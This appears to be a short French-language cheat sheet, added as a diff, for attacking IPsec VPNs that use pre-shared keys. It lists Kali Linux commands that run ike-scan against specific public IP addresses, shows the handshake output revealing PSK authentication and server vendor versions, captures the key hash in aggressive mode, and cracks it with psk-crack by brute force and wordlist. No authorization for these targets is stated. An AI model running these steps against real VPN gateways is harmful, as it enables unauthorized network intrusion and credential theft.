@@ -1,0 +1,50 @@
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+	IKE-SCAN
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+[Objectif]: HACK VPN IPSEC PSK 
+	-vérifier @IP sur laquelle un IKE server s'execute
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+[Pratiques]:
+
+1. 
+root@kali:~# ike-scan 179.60.192.36
+
+2.
+root@kali:~# ike-scan 112.26.124.249
+Starting ike-scan 1.9.4 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+112.26.124.249	Main Mode Handshake returned HDR=(CKY-R=ad0ab684ad6741e9) SA=(Enc=3DES Hash=SHA1 Auth=PSK Group=2:modp1024 LifeType=Seconds LifeDuration(4)=0x00007080) VID=77e8eea6f556a499de3ffe7f7f95661c (strongSwan 4.0.2) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+
+3.
+root@kali:~# ike-scan 112.26.124.249 -M 
+Starting ike-scan 1.9.4 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+112.26.124.249	Main Mode Handshake returned
+	HDR=(CKY-R=f12bfcbe350668c6)
+	SA=(Enc=AES KeyLength=256 Hash=SHA1 Group=14:modp2048 Auth=PSK LifeType=Seconds LifeDuration(4)=0x00007080)
+	VID=4f4568794c64414365636661 (Openswan 2.6.32)
+	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+	VID=4a131c81070358455c5728f20e95452f (RFC 3947 NAT-T)
+
+Ending ike-scan 1.9.4: 1 hosts scanned in 0.244 seconds (4.11 hosts/sec).  1 returned handshake; 0 returned noti
+
+4.
+root@kali:~# ike-scan 112.26.124.249 -M -P -A
+
+5.
+root@kali:~# psk-crack -b 5 vpnpsk.txt -d crunch.txt
+root@kali:~# psk-crack -d crunch.txt vpnpsk.txt
+
+
+
+
+
+
+
+
+
+
+
+
+
